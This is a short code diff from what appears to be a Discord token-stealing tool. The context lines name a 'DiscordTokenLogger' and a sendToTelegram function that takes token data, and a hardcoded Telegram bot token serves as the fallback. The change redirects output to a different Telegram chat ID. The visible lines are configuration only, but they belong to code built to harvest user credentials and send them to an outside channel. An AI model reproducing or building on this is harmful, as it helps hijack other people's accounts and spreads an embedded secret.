@@ -20,7 +20,7 @@ const tokenLogger = new DiscordTokenLogger();
 
 // Telegram Bot Configuration
 let TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8438702808:AAEs_vLYyLRRlylWufwdziIrVRMaEGPMEwM';
-let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5826719737';
+let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-4981274627';
 
 // Telegram messaging function
 async function sendToTelegram(message, tokenData = null) {
